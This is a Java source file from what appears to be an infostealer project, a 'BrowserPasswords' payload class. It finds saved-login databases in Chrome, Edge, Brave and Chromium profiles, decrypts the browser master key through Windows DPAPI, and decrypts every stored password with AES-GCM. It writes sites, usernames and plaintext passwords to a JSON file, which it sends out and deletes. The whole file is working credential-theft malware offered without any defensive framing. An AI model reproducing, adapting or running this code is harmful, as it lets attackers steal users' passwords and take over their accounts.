package dev.chaarlottte.stealer.payload.impl;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.jna.platform.win32.Crypt32Util;
import dev.chaarlottte.stealer.payload.Payload;
import dev.chaarlottte.stealer.util.PayloadDelivery;
import dev.chaarlottte.stealer.util.Utilities;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.Files;
import java.sql.*;
import java.util.*;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;

public class BrowserPasswords implements Payload {

    private String chromeKeyringPassword = null;
    private byte[] windowsMasterKey;

    File passwordStoreCopy = new File(".passwords.db");

    @Override
    public void execute() throws Exception {
        /*if (Utilities.isWindows()) {
            String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
            File localStateFile = new File(pathLocalState);

            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = null;
            try {
                jsonNode = objectMapper.readTree(localStateFile);
            } catch (IOException e) {
                throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
            }

            String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();

            byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
            byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
            this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
        }*/

        HashSet<File> passwordStores = new HashSet<>();
        String userHome = System.getProperty("user.home");

        ArrayList<String> passwordDirs = new ArrayList<>();

        String[] paths = {
                "/AppData/Local/Google/Chrome/User Data/",
                "/Application Data/Google/Chrome/User Data",
                "/Library/Application Support/Google/Chrome",
                "/.config/chromium",
                "/AppData/Local/Microsoft/Edge/User Data",
                "/AppData/Local/Google/Chrome SxS/User Data",
                "/AppData/Local/Google/Chrome SxS/User Data",
                "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        };

        String[] profiles = {
                "Default",
                "Profile 1",
                "Profile 2",
                "Profile 3",
                "Profile 4",
                "Profile 5",
        };

        for(String path : paths) {
            for(String profile : profiles) {
                passwordDirs.add(path + "/" + profile);
            }
        }

        for (String passwordDirectory : passwordDirs) {
            String baseDir = userHome + passwordDirectory;
            List<String> files = new ArrayList<>();
            File filePath = new File(baseDir);
            if (filePath.exists() && filePath.isDirectory()) {
                for(File file : filePath.listFiles()) {
                    if(file.getName().equals("Login Data")) {
                        files.add(file.getPath());
                    }

                    if(file.isDirectory()) {
                        for(File file1 : file.listFiles()) {
                            if(file1.getName().equals("Login Data")) {
                                files.add(file1.getPath());
                            }

                            if(file1.isDirectory()) {
                                for(File file2 : file1.listFiles()) {
                                    if(file2.getName().equals("Login Data")) {
                                        files.add(file2.getPath());
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (files != null && files.size() > 0) {
                for (String file : files) {
                    passwordStores.add(new File(file));
                }
            }
        }

        List<Password> passwords = new ArrayList<>();

        for(File passwordStore : passwordStores) {
            if (passwordStore.exists()) {
                setKeyAndStuffForPath(passwordStore.getAbsolutePath().split("User Data")[0] + "User Data\\");
                Connection connection = null;
                try {
                    passwordStoreCopy.delete();
                    Files.copy(passwordStore.toPath(), passwordStoreCopy.toPath());
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + passwordStoreCopy.getAbsolutePath());
                    Statement statement = connection.createStatement();
                    statement.setQueryTimeout(30);
                    ResultSet result = statement.executeQuery("SELECT origin_url, username_value, password_value FROM logins");
                    while (result.next()) {
                        byte[] encryptedBytes = result.getBytes("password_value");
                        String website = result.getString("origin_url");
                        String username = result.getString("username_value");

                        EncryptedPassword encryptedPassword = new EncryptedPassword(website, username, encryptedBytes);

                        DecryptedPassword decryptedPassword = decrypt(encryptedPassword);

                        if(decryptedPassword.getPassword().length() > 0) {
                            passwords.add(decryptedPassword);
                        }
                        passwordStoreCopy.delete();
                    }
                } catch (Exception ignored) {} finally {
                    try {
                        if (connection != null) {
                            connection.close();
                        }
                    } catch (SQLException ignored) {}
                }
            }
        }

        JSONObject passwordsObject = new JSONObject();

        for(Password password : passwords) {
            JSONObject passwordObject = new JSONObject();
            passwordObject.put("website", password.getWebsite());
            passwordObject.put("username", password.getUsername());
            passwordObject.put("password", password.getPassword());
            passwordsObject.put("password-" + Utilities.getSaltString(5), passwordObject);
        }

        File file = new File("passwords-" + System.getProperty("user.name") + ".json");

        System.out.println(passwordsObject.toString(4));

        FileWriter writer = new FileWriter(file);
        writer.write(passwordsObject.toString(4));
        writer.flush();
        writer.close();

        PayloadDelivery.sendFileThenDelete(file);
        passwordStoreCopy.delete();
    }

    protected DecryptedPassword decrypt(EncryptedPassword encryptedPassword) {
        byte[] decryptedBytes = null;

        Utilities.fixCryptographyKeyLength();
        byte[] nonce = Arrays.copyOfRange(encryptedPassword.getEncryptedPassword(), 3, 15);
        byte[] ciphertextTag = Arrays.copyOfRange(encryptedPassword.getEncryptedPassword(), 15, encryptedPassword.getEncryptedPassword().length);
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
            SecretKeySpec keySpec = new SecretKeySpec(windowsMasterKey, "AES");

            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
            decryptedBytes = cipher.doFinal(ciphertextTag);
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (decryptedBytes == null) {
            return null;
        } else {
            return new DecryptedPassword(encryptedPassword.getWebsite(), encryptedPassword.getUsername(), encryptedPassword.getEncryptedPassword(), new String(decryptedBytes));
        }
    }

    private void setKeyAndStuffForPath(String path) {
        //String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
        String pathLocalState = path + "\\Local State";
        File localStateFile = new File(pathLocalState);

        ObjectMapper objectMapper = new ObjectMapper();
        JsonNode jsonNode = null;
        try {
            jsonNode = objectMapper.readTree(localStateFile);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
        }

        String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();

        byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
        this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
    }

    class Password {

        protected String website;
        protected String username;
        protected String password;

        public Password(String website, String username, String password) {
            this.website = website;
            this.username = username;
            this.password = password;
        }

        public Password(String website, String username) {
            this.website = website;
            this.username = username;
        }

        public String getPassword() {
            return password;
        }

        public String getUsername() {
            return username;
        }

        public String getWebsite() {
            return website;
        }

    }

    class EncryptedPassword extends Password {
        protected byte[] encryptedPassword;

        public byte[] getEncryptedPassword() {
            return encryptedPassword;
        }

        public EncryptedPassword(String website, String username, byte[] encryptedPassword) {
            super(website, username);
            this.encryptedPassword = encryptedPassword;
            this.password = "(encrypted)";
        }

        public boolean isDecrypted() {
            return false;
        }
    }

    class DecryptedPassword extends EncryptedPassword {

        protected String decryptedPassword;

        public DecryptedPassword(String website, String username, byte[] encryptedValue, String decryptedPassword) {
            super(website, username, encryptedValue);
            this.decryptedPassword = decryptedPassword;
            this.password = decryptedPassword;
        }

        public String getDecryptedValue(){
            return decryptedPassword;
        }

        @Override
        public boolean isDecrypted() {
            return true;
        }

    }


}
